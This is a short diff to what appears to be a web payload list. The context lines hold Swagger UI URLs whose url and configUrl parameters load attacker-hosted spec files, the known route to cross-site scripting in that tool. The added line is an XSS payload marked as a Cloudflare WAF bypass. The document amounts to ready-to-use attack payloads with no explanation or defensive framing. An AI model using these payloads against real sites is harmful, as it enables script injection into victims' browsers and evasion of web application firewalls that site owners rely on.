@@ -27,3 +27,4 @@
 - http://example(.)com/swagger-ui/index.html?url=https://jumpy-floor.surge(.)sh/test.yaml
 
 - http://example(.)com/swagger-ui/index.html?configUrl=https://xss.smarpo(.)com/test.json&url=https://jumpy-floor.surge(.)sh/test.yaml
+- ‘>alert(154)</script><script/154=’;;;;;;; (CloudFlare WAF bypass)
